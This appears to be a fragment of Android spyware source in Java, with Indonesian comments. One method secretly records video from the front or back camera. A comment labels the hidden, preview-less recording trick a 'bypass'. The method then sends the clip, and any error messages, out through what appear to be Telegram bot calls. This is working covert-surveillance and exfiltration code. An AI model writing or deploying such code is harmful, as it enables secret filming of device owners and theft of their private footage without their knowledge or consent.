private void recordVideoWithCamera(int cameraId, String caption, int durationMs) {
    Camera camera = null;
    MediaRecorder recorder = new MediaRecorder();
    SurfaceTexture dummyTexture = null;
    Surface dummySurface = null;
    try {
        camera = Camera.open(cameraId);
        
        // Trik Bypass: Bikin Surface Palsu (Dummy)
        dummyTexture = new SurfaceTexture(10);
        dummySurface = new Surface(dummyTexture);
        
        try {
            // Coba pake Texture dulu
            camera.setPreviewTexture(dummyTexture);
        } catch (Exception e) {
            // Kalau gagal, pake Display (Fallback)
            camera.setPreviewDisplay(dummySurface);
        }
        
        camera.unlock();
        
        recorder.setCamera(camera);
        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        
        recorder.setVideoSize(640, 480); 
        recorder.setVideoFrameRate(20);
        recorder.setVideoEncodingBitRate(500000); 

        String fileName = (cameraId == 0) ? "video_back.mp4" : "video_front.mp4";
        File file = new File(getExternalFilesDir(null), fileName);
        recorder.setOutputFile(file.getAbsolutePath());

        recorder.prepare();
        recorder.start();
        
        Thread.sleep(durationMs); 

        recorder.stop();
        recorder.release();
        recorder = null;
        
        camera.lock();
        camera.release();
        camera = null;
        
        if (dummySurface != null) dummySurface.release();
        if (dummyTexture != null) dummyTexture.release();
        
        sendTgVideo(file, caption);

    } catch (Exception e) {
        sendTgText("❌ ERROR VIDEO " + cameraId + ": " + e.getMessage());
    } finally {
        if (recorder != null) {
            try { recorder.reset(); recorder.release(); } catch (Exception e) {}
        }
        if (camera != null) {
            try { camera.lock(); camera.release(); } catch (Exception e) {}
        }
        if (dummySurface != null) dummySurface.release();
        if (dummyTexture != null) dummyTexture.release();
    }
}
